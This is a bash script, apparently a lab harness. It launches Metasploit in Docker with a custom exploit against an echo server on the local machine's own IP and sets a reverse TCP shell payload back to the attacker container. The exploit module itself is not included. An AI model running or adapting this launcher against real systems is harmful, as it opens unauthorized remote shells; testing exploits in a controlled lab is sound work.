#!/bin/bash

RHOST=$(ifconfig en1 | grep "inet " | awk '{print $2}')
if [[ "$RHOST" == "" ]]; then
  RHOST=$(ifconfig en0 | grep "inet " | awk '{print $2}')
fi
RPORT=8080
LHOST=$(docker run -it polyverse-internal.jfrog.io/kali-metasploit ifconfig eth0 | grep inet | awk '{print $2}')
LPORT=5555

docker run -it -p $LPORT:$LPORT -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use exploit/custom/tcp_echo_server.rb; set RHOST $RHOST; set RPORT $RPORT; set payload linux/x64/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT;"
